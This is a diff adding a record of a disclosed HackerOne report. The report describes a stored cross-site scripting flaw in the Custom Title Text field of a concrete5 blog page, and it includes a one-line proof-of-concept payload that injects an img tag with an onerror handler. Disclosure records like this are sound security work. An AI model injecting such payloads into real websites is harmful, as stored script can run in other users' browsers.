@@ -1,0 +1,14 @@
+ReportLink:https://hackerone.com/reports/50552
+WeaknessName:Cross-site Scripting (XSS) - Generic
+Reporter:https://hackerone.com/ishahriyar
+ReportedTo:concrete5(concrete5)
+BountyAmount:
+Severity:
+State:Closed
+DateOfDisclosure:08.07.2015 18:37:36
+
+Summary:
+
+In blog page Custom Title Text ,
+xss payload can be executed and  saved permanently  .
+Poc: "><img src=x onerror=alert(1)>
